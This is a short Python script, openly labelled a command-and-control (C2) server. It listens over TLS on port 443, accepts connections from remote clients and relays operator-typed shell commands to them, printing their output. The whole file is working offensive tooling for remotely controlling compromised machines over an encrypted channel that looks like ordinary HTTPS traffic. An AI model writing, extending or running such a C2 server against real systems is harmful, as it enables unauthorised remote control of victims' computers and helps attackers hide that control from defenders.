#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Rich C2 Server - Command & Control"""

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
import socket
import threading
import ssl
import json
import base64

console = Console()

class C2Server:
    def __init__(self):
        self.host = "0.0.0.0"
        self.port = 443
        self.clients = []
        
    def encrypted_communication(self):
        """SSL/TLS encrypted C2"""
        console.print(Panel.fit(
            "[bold cyan]Rich C2 Server - Encrypted[/bold cyan]",
            border_style="cyan"
        ))
        
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.load_cert_chain('server.crt', 'server.key')
        
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.bind((self.host, self.port))
            sock.listen(5)
            console.print(f"[green]✓ C2 listening on {self.host}:{self.port}[/green]")
            
            with context.wrap_socket(sock, server_side=True) as ssock:
                while True:
                    try:
                        client, addr = ssock.accept()
                        console.print(f"[green]✓ Encrypted connection from {addr}[/green]")
                        threading.Thread(target=self.handle_client, args=(client, addr)).start()
                    except Exception as e:
                        console.print(f"[red]Error: {e}[/red]")
    
    def handle_client(self, client, addr):
        """Handle client commands"""
        while True:
            try:
                command = input(f"\n[{addr}] $ ")
                if command.lower() == 'exit':
                    break
                client.send(command.encode())
                response = client.recv(4096).decode()
                console.print(f"[cyan]{response}[/cyan]")
            except:
                break

if __name__ == "__main__":
    c2 = C2Server()
    c2.encrypted_communication()

